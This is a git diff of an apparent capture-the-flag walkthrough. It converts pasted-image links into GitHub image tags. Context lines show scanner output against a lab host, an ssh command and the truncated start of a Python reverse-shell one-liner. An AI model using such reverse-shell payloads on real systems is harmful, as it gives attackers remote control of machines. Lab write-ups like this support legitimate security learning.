@@ -1,5 +1,6 @@
 
-![[Pasted image 20261015233145.png]]
+<img width="1896" height="765" alt="image" src="https://github.com/user-attachments/assets/3db182b4-c53b-4a96-a24d-ab6b86b0cb64" />
+
 
 
 ```
@@ -435,16 +436,20 @@ http://192.168.0.105/+ [999984] /: Server may leak inodes via ETags, header foun
 ```
 
 
-![[Pasted image 20261016000336.png]]
+<img width="1528" height="751" alt="image" src="https://github.com/user-attachments/assets/507c9c7a-ed4f-4621-b750-b906687dc883" />
 
 
-![[Pasted image 20261016000617.png]]
+
+<img width="1682" height="714" alt="image" src="https://github.com/user-attachments/assets/3a401f63-9a34-4f70-a180-2c8cbdf76b7f" />
 
 
-![[Pasted image 20261016001803.png]]
+
+<img width="1919" height="601" alt="image" src="https://github.com/user-attachments/assets/0cd8e419-3c40-49db-9265-c54f4b4e6352" />
 
 
-![[Pasted image 20261016001829.png]]
+
+<img width="1917" height="976" alt="image" src="https://github.com/user-attachments/assets/ec2b7477-6f42-4fa6-8f8f-f4129b3654c0" />
+
 
 
 ```
@@ -489,10 +494,12 @@ ssh -o KexAlgorithms=+diffie-hellman-group14-sha256 -o HostKeyAlgorithms=+ssh-rs
 ```
 
 
-![[Pasted image 20261016170703.png]]
+<img width="1898" height="304" alt="image" src="https://github.com/user-attachments/assets/f79105d2-7d18-40e2-8de0-19d9f6cece1f" />
 
 
-![[Pasted image 20261016170855.png]]
+
+<img width="920" height="808" alt="image" src="https://github.com/user-attachments/assets/94013c87-42ab-42cc-b48e-e360af96f755" />
+
 
 
 
@@ -597,7 +604,8 @@ uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)
 ```
 
 
-![[Pasted image 20261016180958.png]]
+<img width="1248" height="302" alt="image" src="https://github.com/user-attachments/assets/2fa91d85-e137-47ab-b554-f0935654e9a2" />
+
 
 
 ```
@@ -605,14 +613,17 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 ```
 
-![[Pasted image 20261016181044.png]]
+<img width="1620" height="786" alt="image" src="https://github.com/user-attachments/assets/9ccec051-f908-4259-bf6e-7079ec044e4c" />
 
 
 
-![[Pasted image 20261016181107.png]]
+
+<img width="1149" height="803" alt="image" src="https://github.com/user-attachments/assets/79994e9a-610a-4b15-9ae5-7a2e8cef3338" />
 
 
-![[Pasted image 20261016181139.png]]
+
+<img width="1118" height="320" alt="image" src="https://github.com/user-attachments/assets/825078bc-c879-48c3-bc49-2b6e6a0de46b" />
+
 
 
 ```
